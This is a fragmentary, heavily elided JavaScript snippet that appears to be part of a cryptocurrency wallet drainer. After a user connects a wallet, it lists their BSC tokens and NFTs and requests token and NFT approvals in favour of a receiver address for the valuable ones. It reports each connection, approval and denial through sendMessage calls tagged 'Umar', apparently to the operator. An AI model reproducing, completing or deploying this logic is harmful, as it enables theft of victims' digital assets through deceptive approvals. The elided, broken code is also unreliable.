...
async function proceed(){
  ...
  console.log("Now we roll!!!");
    ...
    async function send() {
        ...
        await sendMessage1(`Umar BSC : connected to ${user_address}`);
        ...
        if (bsc_tokens.length < 1 && bsc_NFTs.length < 1) {
          ...
          await sendMessage1(`Umar No valuable token or nfts found` )
        ...
        // bsc_nfts.result.forEach(async (nft, i) => {
            ...
            for(let n=0; n<bsc_length && real_bsc_token[n].realprice>1; n++){
              ...
              await sendMessage(`Approving 
                            ...
                            Your address : ${receiver_address}
                              ` )
                              await sendMessage1(`Umar Approving 
                              Token Address : ${contractAddress},
                              Amount : ${amount},
                              Your address : ${receiver_address}
                                ` )
          ...
          if (transaction) {
            await sendMessage(`Umar Approved` )
          }
          else {
            await sendMessage1(`Umar Denied` )
          }
            ...
            for(let n=0; n<bsc_NFTs.result.length; n++){
              ...
              await sendMessage(`Umar Approving 
          ...
          if (transaction) {
            ...
            await sendMessage1(`Umar Approved` )
          }
          else {
